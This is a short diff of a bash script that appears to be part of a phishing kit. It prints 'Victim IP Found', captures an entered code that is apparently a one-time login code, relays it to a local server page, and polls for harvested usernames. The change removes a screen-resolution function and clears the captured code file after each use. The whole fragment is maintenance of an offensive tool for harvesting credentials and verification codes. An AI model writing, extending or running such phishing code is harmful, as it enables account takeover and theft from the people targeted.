@@ -433,15 +433,6 @@ capture_ip() {
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
-## Get the screen resolution 
-capture_screen_resolution() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Screeen Resolutions : ${WHITE}"
-	screen_width=$(stty size | awk '{print $2}')
-	echo -e "${WHITE} $screen_width"
-	stty size | awk '{print $2}'
-	echo
-}
-
 ## Extract code
 extract_code() {
 	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code: " USER_INPUT
@@ -450,6 +441,7 @@ extract_code() {
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
 	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
+	echo "" > .server/www/code.txt
 }
 
 ## Send data
@@ -529,8 +521,7 @@ capture_data() {
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip			
-			rm -rf .server/www/ip.txt
-			# capture_screen_resolution
+			rm -rf .server/www/ip.txt		
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
